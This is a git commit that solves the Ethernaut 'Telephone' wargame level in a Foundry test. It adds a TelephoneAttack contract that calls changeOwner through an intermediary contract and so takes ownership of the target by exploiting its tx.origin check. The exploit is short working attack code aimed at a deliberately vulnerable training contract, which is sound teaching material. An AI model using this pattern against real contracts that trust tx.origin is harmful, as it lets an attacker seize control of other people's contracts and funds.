7655639a775a15d31743b670f16d2646b2a6120e
islu <38793955+islu@users.noreply.github.com>
2024-04-12 12:06:02 +0800

    solve challenge (telephone)

--- src/levels/Telephone.sol
+++ src/levels/Telephone.sol
@@ -1,6 +1,10 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+// Claim ownership of the contract below to complete this level.
+//
+// Things that might help
+//  - See the "?" page above, section "Beyond the console"
 contract Telephone {
     address public owner;
 
--- test/Telephone.t.sol
+++ test/Telephone.t.sol
@@ -5,19 +5,52 @@ import {EthernautTest} from "./utils/EthernautTest.sol";
 import {TelephoneFactory} from "../src/factories/TelephoneFactory.sol";
 import {Telephone} from "../src/levels/Telephone.sol";
 
+import "forge-std/console.sol";
+
 contract TelephoneTest is EthernautTest {
     function setUp() public override {
-	super.setUp();
+        super.setUp();
         TelephoneFactory factory = new TelephoneFactory();
         ethernaut.registerLevel(factory);
         levelAddress = ethernaut.createLevelInstance(factory);
     }
 
     function testSolveTelephone() public {
-	Telephone instance = Telephone(payable(levelAddress));
+        Telephone instance = Telephone(payable(levelAddress));
 
-	// insert your code here!
-	
+        // [START]
+
+        // console.log("msg.sender", msg.sender);
+        // console.log("tx.origin", tx.origin);
+        console.log("[Before] owner", instance.owner());
+
+        // 1. Deploy attacker contract
+        TelephoneAttack attacker = new TelephoneAttack(payable(levelAddress));
+
+        // 2. Call attack function
+        attacker.attack();
+
+        // console.log("msg.sender", msg.sender);
+        console.log("[After] owner", instance.owner());
+
+        // [END]
+
         assert(ethernaut.submitLevelInstance(payable(levelAddress)));
+    }
+}
+
+// Attack contract
+contract TelephoneAttack {
+    Telephone public target;
+
+    constructor(address _target) {
+        target = Telephone(payable(_target));
+    }
+
+    function attack() public {
+        // console.log("msg.sender", msg.sender);
+        // console.log("tx.origin", tx.origin);
+
+        target.changeOwner(msg.sender);
     }
 }
